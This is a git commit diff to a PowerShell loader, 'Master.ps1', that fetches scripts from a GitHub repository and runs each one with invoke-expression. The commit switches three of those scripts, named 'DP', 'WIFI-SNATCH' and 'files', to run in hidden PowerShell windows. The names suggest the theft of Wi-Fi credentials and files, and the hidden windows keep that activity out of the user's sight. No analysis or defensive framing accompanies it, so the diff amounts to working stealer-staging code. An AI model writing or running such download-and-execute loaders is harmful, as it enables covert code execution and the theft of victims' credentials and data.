08d0dc3a3f6c1dc3bd98531dc525bfb3db2f623c
skekic16 <151707511+skekic16@users.noreply.github.com>
2024-01-02 21:29:48 -0600

    Update Master.ps1

--- Master.ps1
+++ Master.ps1
@@ -1,9 +1,14 @@
 
+
+
+
+
+
 $task1 = iwr https://github.com/skekic16/lol/raw/main/task1.ps1?dl=1; invoke-expression $task1
 $task2 = iwr https://github.com/skekic16/lol/raw/main/task2.ps1?dl=1; invoke-expression $task2
-$px = iwr https://github.com/skekic16/lol/raw/main/DP.ps1?dl=1; invoke-expression $px
-$pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH.ps1?dl=1; invoke-expression $pg
-$pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $pw
+start powershell -argumentlist '-windowstyle hidden $px = iwr https://github.com/skekic16/lol/raw/main/DP.ps1?dl=1; invoke-expression $px'
+start powershell -argumentlist '-windowstyle hidden $pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH.ps1?dl=1; invoke-expression $pg'
+start powershell -argumentlist '-windowstyle hidden $pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $pw'
 
 
 
